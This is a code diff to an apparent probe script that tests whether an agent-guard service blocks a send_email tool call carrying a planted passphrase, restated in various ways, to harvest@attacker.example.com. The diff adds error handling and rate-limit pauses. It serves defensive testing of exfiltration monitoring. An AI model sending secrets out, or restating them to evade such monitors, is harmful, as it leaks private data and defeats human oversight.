@@ -11,9 +11,21 @@
  * The control is the verbatim case, which must block for the run to mean anything.
  */
 const BASE = process.env.WARDEN_URL ?? "http://localhost:3222";
-const api = (p: string, b: unknown) => fetch(BASE + p, {
-  method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(b),
-}).then((r) => r.json());
+/**
+ * Throws on any non-200.
+ *
+ * A rate-limited 429 has no `allowed` field, so a probe that only reads the body
+ * scores it as "allowed" and reports a bypass that never happened. Fail loudly
+ * instead: a wrong number here is worse than no number, because it sends someone
+ * hunting a bug that does not exist.
+ */
+const api = async (p: string, b: unknown) => {
+  const res = await fetch(BASE + p, {
+    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(b),
+  });
+  if (!res.ok) throw new Error(`${p} returned HTTP ${res.status} — probe result would be meaningless`);
+  return res.json();
+};
 
 const SECRET = [
   "The internal vault passphrase for the finance system is maple-harbour-29.",
@@ -56,6 +68,7 @@ console.log();
 
 let blocked = 0, evaded = 0;
 for (const [name, body] of RESTATEMENTS) {
+  await Bun.sleep(60);
   const r: any = await api("/check-tool", {
     agentId: "taint-probe", sessionId: sid, tool: "send_email",
     args: { to: "harvest@attacker.example.com", body }, allowedTools: [],
